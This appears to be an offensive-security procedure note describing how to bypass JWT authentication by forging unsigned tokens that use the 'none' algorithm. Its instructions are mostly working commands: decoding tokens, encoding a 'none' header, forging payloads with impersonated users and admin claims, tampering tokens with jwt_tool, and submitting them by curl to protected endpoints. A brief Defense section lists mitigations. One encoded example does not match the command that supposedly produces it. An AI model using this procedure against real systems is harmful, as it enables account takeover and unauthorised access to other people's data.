---
type: procedure
description: >-
  Bypass JWT authentication by crafting or tampering a token to use the 'none'
  algorithm, resulting in an unsigned token accepted by misconfigured servers.
verified: true
submitted: false
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Valid Accounts]]'
sub_techniques: []
tags:
  - jwt
  - authentication-bypass
  - null-signature
commands:
  - '[[commands/output-jwt-null-header-json]]'
  - '[[commands/output-jwt-payload-json]]'
  - '[[commands/jwt-tool-tamper-to-null]]'
platforms:
  - Web
tools:
  - '[[tools/jwt_tool]]'
validated: true
---

# jwt-null-signature-authentication-bypass

## Summary

This procedure exploits a common JWT misconfiguration where the server accepts tokens with the 'none' algorithm, allowing attackers to create unsigned tokens for authentication bypass. By crafting a custom token with desired claims (e.g., user ID or admin privileges) or tampering an existing one, an attacker can impersonate any user and access protected resources without valid credentials.

## Description

JSON Web Tokens (JWTs) are used for secure data exchange in web applications, typically consisting of a header, payload, and signature separated by dots and base64url encoded. The header specifies the signing algorithm (alg). If a server is misconfigured to accept 'alg': 'none', attackers can submit an unsigned token (ending with a single dot) that bypasses signature verification. This vulnerability arises from improper validation in JWT libraries and can lead to full account takeover. The procedure covers crafting a new token from scratch or using tools to tamper an existing one, assuming the target endpoint expects a Bearer token in the Authorization header. Success depends on the server's acceptance of unsigned tokens; test in non-production environments.

## Requirements

1. Network access to the target web application using JWT for authentication
2. Python 3 installed on the attacker's machine
3. jwt_tool installed (see [[tools/jwt_tool]] for setup)
4. Knowledge of the target's JWT structure (e.g., required claims like 'sub' for user ID)

## Defense

- Configure JWT validation to explicitly reject the 'none' algorithm and require signatures
- Use asymmetric algorithms like RS256 instead of symmetric ones like HS256 to prevent algorithm confusion attacks
- Implement strict claim validation and token expiration checks
- Monitor for anomalous token usage, such as unexpected admin claims or high-frequency token issuance
- Regularly audit and update JWT libraries to patch known vulnerabilities

## Objectives

1. Bypass authentication mechanisms to access protected endpoints
2. Impersonate legitimate users by manipulating token claims
3. Gain unauthorized access to sensitive data or perform privileged actions

## Instructions

### Step 1: Prepare the Environment

**Context**: Ensure jwt_tool is available for token manipulation. This step verifies tool functionality and decodes any existing token to understand the required structure.

Install and test jwt_tool as per [[tools/jwt_tool]]. If you have an existing valid token from the target (e.g., obtained via reconnaissance or a low-priv account), decode it to inspect claims.

**Command** ([[commands/jwt-tool-tamper-to-null]]):

Use this in tamper mode, but for decoding, invoke with -d flag (see tool docs for full options).

```bash
python3 jwt_tool.py $_EXISTING_TOKEN -d
```

> The -d flag decodes the token without verification, revealing header (algorithms) and payload (claims). Note any required claims like 'sub', 'exp', or custom roles to replicate in your custom token.

**Expected Output**: Decoded JSON for header and payload, e.g., Header: {'alg': 'HS256', 'typ': 'JWT'}, Payload: {'sub': 'user123', 'iat': 1516239022}.

### Step 2: Create Null Algorithm Header

**Context**: The core of the attack is specifying 'none' in the header to indicate no signature is needed. This step generates the raw JSON, which must then be base64url encoded.

**Command** ([[commands/output-jwt-null-header-json]]):

```bash
echo '{"alg":"none","typ":"JWT"}'
```

> This outputs the header JSON. The 'alg' set to 'none' tricks the server into skipping signature checks if vulnerable.

**Expected Output**: {"alg":"none","typ":"JWT"}

Encode it manually or via inline Python:

```bash
python3 -c "import json, base64; print(base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode('utf-8')).decode('utf-8').rstrip('='))"
```

**Expected Output**: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

**Success Indicators**:
- JSON outputs correctly without syntax errors
- Encoded string matches expected base64url format (no padding =)

### Step 3: Create Custom Payload

**Context**: The payload contains the claims that define user identity and privileges. Customize to impersonate a target user or elevate privileges (e.g., set 'admin': true if the app checks for it).

**Command** ([[commands/output-jwt-payload-json]]):

```bash
echo '{"sub":"target_user","name":"Impersonated User","iat":'$(date +%s)',"admin":true}'
```

> Replace 'target_user' with a known username from reconnaissance. 'iat' is issued-at timestamp; use current Unix time. Add app-specific claims based on Step 1 decoding.

**Expected Output**: {"sub":"target_user","name":"Impersonated User","iat":1720000000,"admin":true}

Encode similarly:

```bash
python3 -c "import json, base64, time; payload = {'sub':'target_user','name':'Impersonated User','iat':int(time.time())} ; print(base64.urlsafe_b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip('='))"
```

**Expected Output**: eyJzdWIiOiJ0YXJnZXdfdXNlciIsIm5hbWUiOiJJbXBlcnNvbmF0ZWQgVXNlciIsImlhdCI6MTcyMDAwMDAwMCwiYWRtaW4iOnRydWV9 (varies with timestamp)

**Success Indicators**:
- Payload includes desired claims without JSON errors
- Encoding produces valid base64url string

### Step 4: Construct and Tamper the Unsigned Token

**Context**: Combine the encoded header and payload with an empty signature. Alternatively, if an existing token is available, tamper it directly using jwt_tool for efficiency.

Set variables:

```bash
HEADER_ENCODED="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
PAYLOAD_ENCODED="eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ"
TOKEN="${HEADER_ENCODED}.${PAYLOAD_ENCODED}."
```

Or tamper an existing token:

**Command** ([[commands/jwt-tool-tamper-to-null]]):

```bash
python3 jwt_tool.py $_ORIGINAL_TOKEN -X n
```

> The -X n flag modifies the input token to use 'none' algorithm and removes the signature, outputting the tampered version. Use this if you have a valid token to base the attack on.

**Expected Output**: Tampered token string, e.g., eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwiaWF0IjoxNTE2MjM5MDIyfQ.

Reference the sample token from [[codes/sample-jwt-null-signature-token]] for testing.

**Success Indicators**:
- Token ends with a single dot (empty signature)
- Decoding the token (via Step 1 method) shows 'alg': 'none' and custom claims

### Step 5: Test Token in Request

**Context**: Submit the token to a protected endpoint to verify bypass. Use tools like curl or Burp Suite to intercept and modify requests.

```bash
curl -H "Authorization: Bearer $TOKEN" https://target.example.com/api/protected-endpoint
```

> Replace with the actual protected URL (e.g., /user/profile or /admin/dashboard). If successful, the server treats the token as valid.

**Expected Output**: HTTP 200 OK with protected data, no 401 Unauthorized.

**Success Indicators**:
- Access granted to restricted resources
- Response includes data tied to impersonated user claims
- No signature validation errors in server logs (if observable)

If the server rejects, try adjusting claims or confirm via decoding that the token is correctly formed.
